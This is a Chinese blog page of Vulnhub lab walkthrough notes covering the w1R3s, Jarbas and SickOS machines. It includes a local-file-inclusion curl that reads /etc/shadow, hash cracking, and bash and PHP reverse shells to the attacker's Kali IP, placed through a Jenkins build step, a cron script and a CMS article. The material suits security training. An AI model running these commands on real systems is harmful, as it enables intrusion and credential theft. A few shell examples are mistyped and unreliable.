@@ -1,0 +1,1333 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="vulnhub, Hyy&#39;s Blog">
+    <meta name="description" content="vulnhub123456#虚拟机ip	192.168.213.1??vulhub 		131kali2019	130centos		135kali2023	156
+
+12345678# xxx is not in the sudoers ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>vulnhub | Hyy&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hyy&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hyy&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            还只是个玩偶的时候，我就很想上战场了。现在机会来了，我唯一的机会。
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">vulnhub</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-25
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="vulnhub"><a href="#vulnhub" class="headerlink" title="vulnhub"></a>vulnhub</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#虚拟机ip	192.168.213.1??</span><br><span class="line">vulhub 		131</span><br><span class="line">kali2019	130</span><br><span class="line">centos		135</span><br><span class="line">kali2023	156</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># xxx is not in the sudoers file </span><br><span class="line">1.切换到超级用户：su</span><br><span class="line">2.打开/etc/sudoers文件：vim /etc/sudoers</span><br><span class="line">3.修改文件内容：</span><br><span class="line">找到“root    ALL=(ALL:ALL)       ALL”一行，</span><br><span class="line">在下面插入内容“xxx   ALL=(ALL:ALL)       ALL”，</span><br><span class="line">然后:wq!强制保存并退出</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#virtual box导入.ova</span><br><span class="line">https://jingyan.baidu.com/article/870c6fc3551e21b03fe4be14.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#虚拟网卡</span><br><span class="line">VMnet0		桥接</span><br><span class="line">VMnet1		仅主机</span><br><span class="line">VMnet8		NAT</span><br><span class="line">https://blog.csdn.net/m0_52318340/article/details/125004109</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="w1R3s"><a href="#w1R3s" class="headerlink" title="w1R3s"></a>w1R3s</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#主机发现</span></span><br><span class="line">ifconfig</span><br><span class="line">sudo nmap -sn <span class="number">192.168</span><span class="number">.213</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">	-sn	Ping Scan - disable port scan</span><br><span class="line">	发现是<span class="number">192.168</span><span class="number">.213</span><span class="number">.140</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#nmap端口扫描及思路</span><br><span class="line">sudo nmap --min-rate 10000 -p- 192.168.213.140</span><br><span class="line">	--min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second</span><br><span class="line">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.213.140</span><br><span class="line">	-O: Enable OS detection</span><br><span class="line">	-sV: Probe open ports to determine service/version info</span><br><span class="line">	-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans</span><br><span class="line">sudo nmap -sU -p21,22,80,3306 192.168.213.140</span><br><span class="line">	-sU: UDP Scan</span><br><span class="line">sudo nmap --script=vuln -p21,22,80,3306 192.168.213.140</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#ftp渗透</span><br><span class="line">ftp 192.168.213.138</span><br><span class="line">	ftp服务器如果允许匿名登录	用户名anonymous密码为空</span><br><span class="line">ftp&gt;ls		#查看文件</span><br><span class="line">ftp&gt;cd content</span><br><span class="line">ftp&gt;mget 0*.txt			#正则匹配下载文件</span><br><span class="line">ftp&gt;ls ../docs</span><br><span class="line">...</span><br><span class="line">hash-identifier &#x27;...&#x27;		#查询可能的加密方式</span><br><span class="line">echo &#x27;...&#x27; | base64 -d		#base64解密</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#web目录爆破</span><br><span class="line">gobuster或dirb或feroxbuster</span><br><span class="line">sudo feroxbuster -u http://192.168.213.140 -w 字典地址</span><br><span class="line">	kali2019字典目录/usr/share/wordlists</span><br><span class="line">	sudo apt install feroxbuster</span><br><span class="line">	此处-w可以不写有自带字典</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#web渗透，本地文件包含利用</span><br><span class="line">获得信息wordpress、cuppa cms</span><br><span class="line">searchsploit cuppa cms</span><br><span class="line">searchsploit cuppa cms -m 25971.txt</span><br><span class="line">cat 25971.txt			#发现文件包含，根据提示，注意target要试一试</span><br><span class="line">sudo curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd 192.168.213.140/administrator/alerts/alertConfigField.php</span><br><span class="line">sudo curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow</span><br><span class="line">	密码在这上面，先整个复制</span><br><span class="line">	sudo vim hash</span><br><span class="line">		:set paste</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#john破解</span><br><span class="line">john hash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#获得初级权限和立足点</span><br><span class="line">ssh登录</span><br><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">sudo -l			#查看权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#sudo提权</span><br><span class="line">sudo /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="工具tmux"><a href="#工具tmux" class="headerlink" title="工具tmux"></a>工具tmux</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#原则</span></span><br><span class="line"><span class="number">1.</span>不用图形界面 使用命令行</span><br><span class="line">    使用curl访问网页</span><br><span class="line">    tcpdump代替wireshark</span><br><span class="line">    burpsuite的替代</span><br><span class="line">        repeat用curl部分实现</span><br><span class="line">        ..</span><br><span class="line">    尽量不用大型框架 metaspliot</span><br><span class="line"><span class="number">2.</span>尽量不用中文工具</span><br><span class="line">	特征明显</span><br><span class="line">	信息技术工具理念国人比较落后</span><br><span class="line"><span class="number">3.</span>尽量不做个性设置</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#终端复用工具</span><br><span class="line">tmux / screen</span><br><span class="line">ctrl + shift + &#x27;+&#x27;		放大字体</span><br><span class="line">ctrl + &#x27;-&#x27;				缩小字体</span><br><span class="line">$ tmux		ctrl b使用tmux命令</span><br><span class="line">ctrl b		&quot;(shift &#x27;) 上下分屏</span><br><span class="line">ctrl b		%(shift 5) 左右分屏</span><br><span class="line">ctrl b		alt(按住)	然后上下左右调整窗口大小</span><br><span class="line">ctrl b  	z窗口最大化 再来一次变回来</span><br><span class="line">ctrl b		方向键切换终端</span><br><span class="line">ctrl b		?看到所有命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#长命令快捷键</span><br><span class="line">ctrl a		回到命令开头</span><br><span class="line">ctrl e 		回到结尾</span><br><span class="line">alt b		向左一个单词</span><br><span class="line">alt f		向右一个单词</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="指令grep-sed-cut-awk"><a href="#指令grep-sed-cut-awk" class="headerlink" title="指令grep sed cut awk"></a>指令grep sed cut awk</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo ls -liah /usr/<span class="built_in">bin</span> | grep <span class="built_in">zip</span></span><br><span class="line">echo <span class="string">&#x27;i love cybersecurity&#x27;</span> | sed <span class="string">&#x27;s/cybersecurity/hyy&#x27;</span></span><br><span class="line">cut -d <span class="string">&quot;:&quot;</span> -f /etc/passwd</span><br><span class="line">	-d 指定分隔符</span><br><span class="line">	-f 指定字段</span><br><span class="line">echo <span class="string">&quot;redteam::hello hyy::notes&quot;</span> | awk -F <span class="string">&quot;::&quot;</span> <span class="string">&#x27;print $1, $3, $2&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	JARBAS</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#安装显示没有.vmx文件不给装，然后换到默认路径就可以了，感觉是冲突了</span></span><br><span class="line">默认路径</span><br><span class="line">	C:\Users\hyy\Documents		即文档</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 192.168.213.0/24			#192.168.213.141</span><br><span class="line">sudo nmap --min-rate 10000 -p- 192.168.213.141			#22 80 3306 8080</span><br><span class="line">sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.213.141</span><br><span class="line">    22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)          │</span><br><span class="line">    80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4│</span><br><span class="line">    .16)                                                       │</span><br><span class="line">    3306/tcp open  mysql   MariaDB (unauthorized)              │</span><br><span class="line">    8080/tcp open  http    Jetty 9.4.z-SNAPSHOT</span><br><span class="line">sudo nmap -sU -p22,80,3306,8080 192.168.213.141			#全是closed</span><br><span class="line">sudo nmap --script=vuln -p22,80,3306,8080 192.168.213.141</span><br><span class="line">	80	/icons/	这个是index of网页</span><br><span class="line">		apache iis服务器目录列表，index of高级搜索命令如</span><br><span class="line">			&quot;index of/&quot;rmvb</span><br><span class="line">		https://blog.csdn.net/ucshng/article/details/1646975</span><br><span class="line">	8080 /robots.txt</span><br><span class="line">		# we don&#x27;t want robots to click &quot;build&quot; links</span><br><span class="line">        User-agent: *</span><br><span class="line">        Disallow: /</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo dirb http://192.168.213.141</span><br><span class="line">sudo gobuster dir -u http://192.168.213.141 -w .../raft-large-directories.txt</span><br><span class="line">sudo gobuster dir -u http://192.168.213.141 -w .../raft-large-directories.txt -x html,php</span><br><span class="line">	多了一个/access.html得到3组密文</span><br><span class="line">		使用mdk.crack破解得到3组用户名密码，在8080端口登录</span><br><span class="line">		三组密码不是对应的eder vipsu可以登录</span><br><span class="line">	Jenkins是一个开源的、提供友好操作界面的持续集成(CI)工具，起源于Hudson（Hudson是商用的），主要用于持续、自动的构建/测试软件项目、监控外部任务的运行（这个比较抽象，暂且写上，不做解释）。Jenkins用Java语言编写，可在Tomcat等流行的servlet容器中运行，也可独立运行。通常与版本管理工具(SCM)、构建工具结合使用。常用的版本控制工具有SVN、GIT，构建工具有Maven、Ant、Gradle。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用jenkins建一个项目，选build里的execute shell</span><br><span class="line">	/bin/bash -i &gt;&amp; /dev/tcp/192.168.213.130/4444 0&gt;&amp;1  #此处为kali机器的ip地址</span><br><span class="line">kali开启监听</span><br><span class="line">	sudo nc -lvnp 4444</span><br><span class="line">jenkins左侧单机build up</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#关于反弹shell 参考https://zhuanlan.zhihu.com/p/346753974</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.213.130/4444 0&gt;&amp;1</span><br><span class="line">	bash -i	打开一个交互bash</span><br><span class="line">	&gt;&amp;		将前面的输入重定向到标准输出</span><br><span class="line">	/dev/tcp/192.168.213.130/4444调用socket连接</span><br><span class="line">	0&gt;&amp;1	标准输入重定向到标准输出，实现反弹出来的shell的交互</span><br><span class="line">	inux shell下常用的文件描述符是：</span><br><span class="line">        1.标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ；</span><br><span class="line">        2.标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ；</span><br><span class="line">        3.标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</span><br><span class="line">        另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">sudo -l		#没有权限</span><br><span class="line">cat /etc/passwd</span><br><span class="line">	#看看有哪些用户，分析下，发现都是功能用户</span><br><span class="line">	shell为nologin用不上，</span><br><span class="line">cat /etc/shadow	#没有权限</span><br><span class="line">cat	/etc/cron.d		#是个目录</span><br><span class="line">cat /etc/crontab</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1667489549090.png" alt="1667489549090"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">最下方执行每5分钟执行/etc/script/CleaningScript.sh,结果被丢弃</span><br><span class="line">cat /etc/script/CleanningScript.sh</span><br><span class="line">echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.213.130/4443 0&gt;&amp;1&quot; &gt;&gt; /etc/script/CleanningScript.sh</span><br><span class="line">kali监听4443端口</span><br><span class="line">	sudo nc -lvnp 4443</span><br><span class="line">等待最多5分钟获得root权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="SICKOS-1-1方法1"><a href="#SICKOS-1-1方法1" class="headerlink" title="SICKOS 1.1方法1"></a>SICKOS 1.1方法1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">需要设置为nat模式</span><br><span class="line"><span class="number">192.168</span><span class="number">.213</span><span class="number">.142</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1667531875025.png" alt="1667531875025"></p>
+<p><img src="/2023/07/25/vulnhub/1667532003885.png" alt="1667532003885"></p>
+<p><img src="/2023/07/25/vulnhub/1667532150645.png" alt="1667532150645"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dirb http://192.168.213.142		#直接扫没有结果</span><br><span class="line">#使用代理			squid是个代理服务器，本站都得用代理才能访问</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1667532691469.png" alt="1667532691469"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">火狐配置下代理 192.168.213.142:3128去访问靶机80端口</span><br><span class="line">依次访问爆破出的目录从/robots获知/wolfcms</span><br><span class="line">百度后台地址/wolfcms/?admin</span><br><span class="line">弱口令admin admin</span><br><span class="line">进入后台在article里加入反弹shell</span><br><span class="line">	&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.213.130/4444 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br><span class="line">kali监听端口</span><br><span class="line">	sudo nc -lvnp 4444</span><br><span class="line">获得初级权限</span><br><span class="line">ls</span><br><span class="line">cat config.php获知</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1667540618947.png" alt="1667540618947"></p>
